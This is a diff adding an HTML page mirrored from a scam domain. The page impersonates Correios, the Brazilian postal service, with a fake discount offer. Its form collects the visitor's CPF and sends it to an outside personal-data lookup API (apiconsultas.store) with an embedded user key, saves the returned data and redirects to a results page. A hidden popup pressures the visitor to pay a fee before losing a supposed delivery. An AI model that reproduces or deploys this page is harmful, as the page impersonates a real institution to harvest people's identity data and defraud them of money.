@@ -1,0 +1,520 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+ <!-- Mirrored from statuspedido.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Jul 2024 20:31:56 GMT -->
+ 
+<!-- Mirrored from seupagamento-oficial.site/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 26 Sep 2024 16:35:58 GMT -->
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>
+   Correios - Login e Rastreamento
+  </title>
+  <script src="3.4.5">
+  </script>
+  <link href="ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+  <style>
+   @keyframes pulse-animation {
+
+    0% {
+
+        transform: scale(1);
+
+    }
+
+    50% {
+
+        transform: scale(1.05);
+
+    }
+
+    100% {
+
+        transform: scale(1);
+
+    }
+
+}
+
+
+
+.pulse {
+
+    animation: pulse-animation 2s infinite;
+
+}
+
+
+
+        body {
+
+            font-family: 'Trebuchet MS', sans-serif;
+
+        }
+
+        .header-fixed {
+
+            position: fixed;
+
+            top: 30px;
+
+            width: 100%;
+
+            z-index: 1000;
+
+            background-color: white;
+
+        }
+
+        .content {
+
+            margin-top: 40px; /* Altura do cabeçalho */
+
+            display: flex;
+
+            flex-direction: column;
+
+            min-height: calc(35vh - 140px); /* Altura da tela menos a altura do cabeçalho */
+
+        }
+
+        .main-content {
+
+            margin-top: 60px;
+
+            flex: 1;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            min-height: 200px; /* Defina a altura fixa desejada */
+
+            margin-bottom: -100pxpx; /* Espaço até o footer */
+
+        }
+
+        .top-bar {
+
+            position: fixed;
+
+            top: 0;
+
+            left: 0;
+
+            width: 100%;
+
+            height: 35px;
+
+            background-color: #ffefb2;
+
+            z-index: 2000;
+
+            display: flex;
+
+            align-items: center;
+
+            padding: 0 10px;
+
+            justify-content: space-between;
+
+        }
+
+        .top-bar span {
+
+            color: #E02424; /* Cor vermelha */
+
+            font-weight: bold;
+
+            cursor: pointer;
+
+            display: flex;
+
+            align-items: center;
+
+        }
+
+        .top-bar span:hover {
+
+            text-decoration: underline;
+
+        }
+
+        .popup {
+
+            position: fixed;
+
+            top: 0;
+
+            left: 0;
+
+            width: 100%;
+
+            height: 100%;
+
+            background-color: rgba(0, 0, 0, 0.5);
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            z-index: 3000;
+
+        }
+
+        .popup-content {
+
+            background-color: white;
+
+            padding: 20px;
+
+            border-radius: 10px;
+
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+
+            max-width: 400px;
+
+            text-align: center;
+
+            animation: fadeIn 0.3s ease-in-out;
+
+        }
+
+        @keyframes fadeIn {
+
+            from { opacity: 0; transform: scale(0.95); }
+
+            to { opacity: 1; transform: scale(1); }
+
+        }
+
+        .popup-header {
+
+            font-size: 1.5rem;
+
+            font-weight: bold;
+
+            margin-bottom: 1rem;
+
+            color: #00416B;
+
+        }
+
+        .popup-message {
+
+            margin-bottom: 1rem;
+
+            font-size: 1rem;
+
+            color: #333;
+
+        }
+
+        .popup-button {
+
+            display: inline-block;
+
+            margin: 10px;
+
+            padding: 10px 20px;
+
+            border-radius: 5px;
+
+            font-weight: bold;
+
+            cursor: pointer;
+
+            transition: background-color 0.3s ease;
+
+        }
+
+        .popup-button-accept {
+
+            background-color: #28a745;
+
+            color: white;
+
+        }
+
+        .popup-button-accept:hover {
+
+            background-color: #218838;
+
+        }
+
+        .popup-button-decline {
+
+            background-color: #dc3545;
+
+            color: white;
+
+        }
+
+        .popup-button-decline:hover {
+
+            background-color: #c82333;
+
+        }
+
+        .popup-button-secondary {
+
+            background-color: #007bff;
+
+            color: white;
+
+        }
+
+        .popup-button-secondary:hover {
+
+            background-color: #0056b3;
+
+        }
+
+        .loading-message {
+
+            font-size: 1.2rem;
+
+            color: #00416B;
+
+            margin-bottom: 1rem;
+
+        }
+  </style>
+  <script>
+   tailwind.config = {
+
+				theme: {
+
+					extend: {
+
+						colors: {
+
+							'correios-yellow': '#618c38',
+
+							'correios-blue': '#618c38',
+
+							'correios-navbar': '#',
+
+							'correios-button': '#1C6114',
+
+							'correios-text': '#618c38',
+
+							'correios-footer-text': '#F5F3F0',
+
+							'correios-menu-icon': '#1C6114',
+
+						},
+
+						fontFamily: {
+
+							'trebuchet': ['"Trebuchet MS"', 'sans-serif'],
+
+						},
+
+					}
+
+				}
+
+			};
+  </script>
+ </head>
+ <body class="bg-gray-100 font-trebuchet">
+  <div class="top-bar" style="display: none;">
+   <span onclick="showPopup()">
+    <i class="">
+    </i>
+   </span>
+  </div>
+  <header class="bg-correios-navbar border-b border-gray-200 p-4 shadow-md header-fixed">
+   <div class="max-w-6xl mx-auto flex justify-between items-center">
+    <button class="text-correios-menu-icon">
+     <img alt="Menu" class="w-10 h-10" src="ect/img/menu.png">
+    </button>
+    <img alt="Correios logo" class="h-auto w-auto" src="img/correios.png" style="max-height: 40px; max-width: 200px;">
+    <div class="w-10">
+     <!-- This empty div is to balance the layout -->
+    </div>
+   </div>
+  </header>
+  <body class="bg-gray-100 font-trebuchet">
+   <header class="bg-correios-navbar border-b border-gray-200 p-4 shadow-md header-fixed">
+    <div class="max-w-6xl mx-auto flex justify-between items-center">
+     <button class="text-correios-menu-icon">
+      <img alt="Menu" class="w-10 h-10" src="ect/img/menu.png">
+     </button>
+     <img alt="Correios logo" class="h-auto w-auto" src="img/correios.png" style="max-height: 40px; max-width: 200px;">
+     <div class="w-10">
+     </div>
+    </div>
+   </header>
+   <div class="content">
+    <div class="main-content">
+     <main class="max-w-md mx-auto bg-white shadow-lg rounded-lg overflow-hidden">
+      <div class="p-8">
+       <h1 class="text-xl font-bold mb-6 text-correios-text text-center">
+         INTERNET ILIMITADA <b></b> COM ATÉ 90% DE DESCONTO
+       </h1>
+    
+       <p class="mt-6 text-sm text-gray-600 text-center">
+        Acesse sua conta abaixo para resgatar a promoção hoje!
+       </p>
+
+       <h1 class="text-xl font-bold mb-6 text-correios-text text-center">
+        Digite seu CPF para acessar:
+       </h1>
+
+       <form id="cpfForm" onsubmit="return validateForm()">
+        <div class="mb-6">
+         <label class="block text-sm font-bold text-gray-700 mb-2" for="cpf">
+          CPF
+         </label>
+         <input class="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-correios-blue" id="cpf" inputmode="numeric" maxlength="14" name="cpf" oninput="formatarCPF(this)" pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" required="" type="tel">
+        </div>
+        <button class="w-full bg-correios-button text-white py-2 rounded font-bold hover:bg-blue-700 transition duration-300" type="submit">
+         ENTRAR
+        </button>
+       </form>
+
+       <script>     
+
+document.getElementById('cpfForm').addEventListener('submit', async function(event) {
+    event.preventDefault(); // Previne o comportamento padrão do formulário
+    
+    const cpf = document.getElementById('cpf').value.replace(/\D/g, ''); // Remove pontos e traços
+    const apiUrl = `https://apiconsultas.store/api/?usuario=03f1ad6ffc4bb309b1660e6a2f8fd5a2&api=cpf&cpf=${cpf}`;
+    
+    try {
+        const response = await fetch(apiUrl);
+        const text = await response.text(); // Obtém a resposta como texto
+        console.log('Resposta da API:', text); // Mostra a resposta no console para depuração
+        
+        // Verifica se a resposta é um JSON válido
+        const data = JSON.parse(text);
+        
+        // Salva os dados no localStorage
+        localStorage.setItem('cpfData', JSON.stringify(data));
+
+        // Redireciona para a página de resultados
+        window.location.href = 'resultado/index.html';
+    } catch (error) {
+        console.error('Erro ao consultar a API:', error);
+    }
+});
+    </script>
+
+       <p class="mt-6 text-sm text-gray-600 text-center">
+        Por razões de segurança, por favor clique em Sair e feche o seu navegador quando terminar de acessar os serviços que precisam de autenticação!
+       </p>
+      </div>
+     </main>
+    </div>
+   </div>
+   <script>
+    function formatarCPF(input) {
+
+            let cpf = input.value.replace(/\D/g, '');
+
+            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+
+            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+
+            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+
+            input.value = cpf;
+
+        }
+   </script>
+   <footer class="bg-correios-yellow">
+    <div class="max-w-6xl mx-auto py-12 px-4 sm:px-6 lg:px-8">
+     <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+      <div>
+       <h2 class="text-2xl font-bold mb-4 text-correios-footer-text">
+        Fale Conosco
+       </h2>
+       <ul class="text-correios-footer-text space-y-2">
+        <li>
+         Registro de manifestações
+        </li>
+        <li>
+         Acompanhamento de manifestações
+        </li>
+        <li>
+         Central de Atendimento
+        </li>
+        <li>
+         Atendimento Comercial
+        </li>
+        <li>
+         Ouvidoria
+        </li>
+        <li>
+         Denúncia
+        </li>
+       </ul>
+      </div>
+      <div>
+       <h2 class="text-2xl font-bold mb-4 text-correios-footer-text">
+        Sobre os Correios
+       </h2>
+       <ul class="text-correios-footer-text space-y-2">
+        <li>
+         Educação e Cultura
+        </li>
+        <li>
+         Código de Ética
+        </li>
+        <li>
+         Venda de Imóveis
+        </li>
+       </ul>
+      </div>
+      <div>
+       <h2 class="text-2xl font-bold mb-4 text-correios-footer-text">
+        Outros Sites
+       </h2>
+       <ul class="text-correios-footer-text space-y-2">
+        <li>
+         Loja online dos Correios
+        </li>
+        <li>
+         Ministério da Ciência, Tecnologia, Inovações e Comunicações
+        </li>
+       </ul>
+      </div>
+     </div>
+     <div class="mt-8 border-t border-correios-footer-text pt-8 text-center">
+      <p class="text-sm text-correios-footer-text">
+       © Copyright 2024 Correios - Todos os direitos reservados
+      </p>
+      <p class="text-xs text-correios-footer-text mt-2">
+       v0.21.27
+      </p>
+     </div>
+    </div>
+   </footer>
+   <div class="hidden popup" id="popup">
+    <div class="popup-content">
+     <h2 class="popup-header">
+      Renegociação Aceita
+     </h2>
+     <p class="popup-message" id="popupMessage">
+      A taxa vai abaixar 50% se você realizar o pagamento agora. Última chance de receber este pedido.
+     </p>
+     <div>
+      <span class="popup-button popup-button-accept" id="acceptButton" onclick="window.location.href='oferta50/index.html'">
+       Aceitar Oferta
+      </span>
+      <span class="popup-button popup-button-decline" id="declineButton" onclick="handleDecline('initial')">
+       Perder o direito de receber
+      </span>
+     </div>
+    </div>
+   </div>
+  </body>
+ </body>
+
+<!-- Mirrored from seupagamento-oficial.site/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 26 Sep 2024 16:36:00 GMT -->
+</html>
